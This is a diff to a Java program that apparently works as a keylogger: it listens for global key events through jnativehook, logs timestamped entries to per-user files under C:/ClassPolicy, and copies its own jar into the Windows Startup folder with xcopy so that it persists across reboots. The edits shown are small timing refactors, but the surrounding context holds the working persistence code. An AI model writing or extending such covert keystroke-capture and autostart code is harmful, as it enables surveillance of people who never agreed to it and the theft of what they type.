@@ -20,7 +20,7 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 
 public class Main implements NativeKeyListener
 {
-	static Stopwatch robert;
+	static Stopwatch robert = null;
 	public Main()
 	{
 		robert = new Stopwatch();
@@ -56,7 +56,6 @@ public class Main implements NativeKeyListener
 		}
 		System.out.println("[" + robert.elapsedTime() + "] [✔] Run Access Granted: All safety checks passed.");
 		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
-	//	 System.out.println("Location " + yiffyiff);
 		String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
 		 @SuppressWarnings("unused")
 		 Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
@@ -77,7 +76,7 @@ public class Main implements NativeKeyListener
 		String fn = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
 		PrintWriter timestamper = new PrintWriter(new FileWriter(fn, true));
 		timestamper.println();
-		timestamper.print("[Startup: " + new SimpleDateFormat("EEEE").format(new Date()) + " +" + getCurrentTimeInBeats() + " ]");
+		timestamper.print("[Startup: " + new SimpleDateFormat("EEEE").format(new Date()) + " +" + getTime() + " ]");
 		timestamper.println();
 		timestamper.close();
 		try
@@ -173,11 +172,11 @@ public class Main implements NativeKeyListener
 		   String OS = System.getProperty("os.name").toLowerCase();
 		   return (OS.indexOf("win") >= 0);
 		}
-	 public static int getCurrentTimeInBeats()
+	 public static double getTime()
 	 	{
-		    java.util.Calendar cal = java.util.Calendar.getInstance( java.util.TimeZone.getTimeZone( "GMT+01:00" ) );
-		    int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
-		    return beats;
+		 //   java.util.Calendar cal = java.util.Calendar.getInstance( java.util.TimeZone.getTimeZone( "GMT+01:00" ) );
+		 //   int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
+		    return robert.getTime();
 		}
 	 public static int getCurrentVersion()
 	 {
